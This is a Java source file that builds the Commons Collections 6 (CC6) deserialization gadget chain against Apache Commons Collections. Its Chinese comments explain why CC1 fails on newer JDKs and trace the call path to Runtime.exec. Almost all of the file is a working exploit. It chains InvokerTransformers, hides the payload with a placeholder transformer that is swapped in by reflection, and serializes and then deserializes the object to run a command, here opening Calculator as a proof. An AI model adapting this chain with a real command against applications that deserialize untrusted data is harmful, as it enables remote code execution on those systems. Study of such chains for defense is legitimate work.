package org.shear1n;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

/*
* CommonsCollections1这条链在Jdk_8u71以后就不能利用了，主要原因是
 sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了。

* 这里看一下CC6这条比较通用的利用链，可以解决高版本jdk利用问题

* Gadget chain:
     java.io.ObjectInputStream.readObject()
     java.util.HashMap.readObject()
     java.util.HashMap.hash()

        org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                org.apache.commons.collections.map.LazyMap.get()
                    org.apache.commons.collections.functors.ChainedTransformer.transform()
                        org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
* */
public class CommonsCollections6 {

    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException, NoSuchFieldException {

        Transformer[] faketransformers = new Transformer[]{
                new ConstantTransformer(1)
        };

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /System/Applications/Calculator.app"})
        };

        Transformer chainedTransformer = new ChainedTransformer(faketransformers);

        HashMap map = new HashMap();
        Map lazymap = LazyMap.decorate(map,chainedTransformer);

        TiedMapEntry tiedMapEntry= new TiedMapEntry(lazymap,"keykey");
        HashMap expMap = new HashMap();
        //执行序列化的时候，这里的put方法里面直接就会调用hash方法，以至于流程就从这走出去了。
        expMap.put(tiedMapEntry,"bbb");

        lazymap.remove("keykey");
        //反射
        Class c = ChainedTransformer.class;
        Field f = c.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer,transformers);

        serializable(expMap);
        unserializable("ser6.bin");

    }

    public static void serializable(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser6.bin"));
        oos.writeObject(obj);
    }

    //重写反序列化
    public static Object unserializable(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream oos = new ObjectInputStream(new FileInputStream(filename));
        Object obj = oos.readObject();
        return obj;
    }
}
